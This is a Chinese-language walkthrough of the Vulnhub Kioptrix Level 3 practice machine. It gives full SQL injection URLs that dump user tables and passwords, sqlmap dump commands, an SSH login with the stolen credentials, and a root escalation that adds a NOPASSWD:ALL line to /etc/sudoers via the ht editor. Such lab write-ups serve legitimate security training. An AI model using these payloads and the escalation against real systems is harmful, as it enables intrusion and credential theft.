---
title: Vulnhub-Kioptrix_Level3
date: 2025-2-25 20:00:00
tags: 红队
categories: 红队打靶-Linux
---

# 信息枚举

## 主机发现

```
netdiscover -i eth0 -r 192.168.137.0/24
```

![image-20250320011732744](./Kioptrix%20Level3/image-20250320011732744.png)

## nmap

![image-20250320011906500](./Kioptrix%20Level3/image-20250320011906500.png)

# WEB服务

![image-20250320014612476](./Kioptrix%20Level3/image-20250320014612476.png)

在此页面点击图片跳转到的是kioptrix3.com，将域名解析添加到/etc/hosts中去就可以正常显示图片

![image-20250320014937046](./Kioptrix%20Level3/image-20250320014937046.png)

当前页面有个排序功能，尝试对id进行sql注入![image-20250320015113210](./Kioptrix%20Level3/image-20250320015113210.png)

出现保存，说明存在注入点，手注测试之后为数字型闭合

## SQL注入

### 手注

判断列数

```
http://kioptrix3.com/gallery/gallery.php?id=0 order by 6--+&sort=photoid#photos
```

```
http://kioptrix3.com/gallery/gallery.php?id=0 union select 1,2,3,4,5,6--+&sort=photoid#photos
```

查询库名

```
http://kioptrix3.com/gallery/gallery.php?id=0 union select 1,database(),3,4,5,6--+&sort=photoid#photos
```

查询表名

```
http://kioptrix3.com/gallery/gallery.php?id=0 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--+&sort=photoid#photos

表名：
dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users
```

查询列名

```
http://kioptrix3.com/gallery/gallery.php?id=0 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name='gallarific_users'--+&sort=photoid#photos

列名：
userid,username,password,usertype,firstname,lastname,email,datejoined,website,issuperuser,photo,joincode
```

查询内容

```
http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,group_concat(id,"~",username,"~",password),3,4,5,6 from dev_accounts --+&sort=#photos

内容
dreg~0d3eccfb887aabd50f243b3f155c0f85(Mast3r)
loneferret~5badcaf789d3d1d09794d8f021f40f0e(starwars)
```

## sqlmap

```
sqlmap -r sql --batch --dbs -p id
```

![image-20250320021618540](./Kioptrix%20Level3/image-20250320021618540.png)

```
sqlmap -r sql --batch -D gallery --tables -p id
```

![image-20250320021634279](./Kioptrix%20Level3/image-20250320021634279.png)

```
sqlmap -r sql --batch -D gallery -T dev_accounts --columns -p id
```

![image-20250320021806341](./Kioptrix%20Level3/image-20250320021806341.png)

```
sqlmap -r sql --batch -D gallery -T dev_accounts -C username,password -p id --dump
```

![image-20250320021851115](./Kioptrix%20Level3/image-20250320021851115.png)

## ssh连接

尝试使用得到的账号密码进行连接

```
ssh loneferret@192.168.137.133  -oHostKeyAlgorithms=+ssh-rsa
```

loneferret用户目录下有checksec.sh和CompanyPolic.README

![image-20250320022424144](./Kioptrix%20Level3/image-20250320022424144.png)

意思就是使用ht编辑器来编辑文档，ht编辑器有sudo权限

那么就只需要在/etc/sudoers中加入该用户就可以了

![image-20250320022816840](./Kioptrix%20Level3/image-20250320022816840.png)

解决方法

```
echo $TERM
export TERM=xterm
echo $TERM
```

ht编辑器最下面这行分别对应F1-F10，搜索/etc/sudoers/进行编辑

![image-20250320023044704](./Kioptrix%20Level3/image-20250320023044704.png)

添加

```
loneferretALL=(ALL) NOPASSWD:ALL 
```

即可成功提权

![image-20250320023340077](./Kioptrix%20Level3/image-20250320023340077.png)

